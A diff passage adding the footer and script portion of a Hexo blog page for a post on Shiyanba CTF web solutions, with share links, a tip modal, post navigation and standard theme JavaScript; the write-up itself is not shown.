+        原文链接：<a href="/posts/65109/" target="_blank" rel="external">https://Foxgrin.github.io/posts/65109/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/65109/&title=《实验吧Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/65109/&title=《实验吧Web》 — Somnus's blog&source=实验吧Web题解" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/65109/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《实验吧Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/65109/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/65109/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/15234/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：2018黑盾杯Web
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/11047/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：Python-flask">下一篇：Python-flask</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/65109/&title=《实验吧Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/65109/&title=《实验吧Web》 — Somnus's blog&source=实验吧Web题解" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/65109/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《实验吧Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/65109/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/65109/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAB00lEQVR42u3aQYrDMAwF0N7/0hmY1UCp+yVHJjDPq5LQ5qULYX359YrX9buSK3+vr7/1fve2hYuLu829lmtNeb++Q18bcHFxz3PXxWv9+I8/3fq1LzZcXNyHcddFJ2fh4uL+B26vQcLFxX0+t1qeet/NC9wNvRouLu4GtxqYTnwezHdxcXGL3Ku4qsOVPByJno6Li3uE22tI8lHKzni1sCPDxcUd4+ZhaDKCzdueG3ZbuLi4A9ydgWte7PIXK8QiuLi4A9ydR+Z3q1FpNETBxcUd5lbjy/yARVIoC8MYXFzcI9x8gNoLSfPjF7dNdXBxcbe51eZkXZ6qjU2+JcLFxT3JrYak+xudZFP1pczh4uIOc/MYNG9mqkPWQkSCi4t7hNs8ANEqZ8lhr7ytwsXFnePmg417T0HkZavQq+Hi4g5wdyKP6uGt5jAGFxf3CLd3tqEajxYQ1SwHFxd3gHsVV3XU2nvtj38HLi7uEW7viEbyqvlodueFcXFx57i9B1eLXa+QReEILi7uGDcvNMkWJ98GlXMPXFzch3HzjU6+JykPYnFxcR/MzY9TJGPUQgiCi4t7kJs3P3mjkgxayvkNLi7uEW6vFemNW6rRSZOOi4vb5/4A9qCaeb1vkOIAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
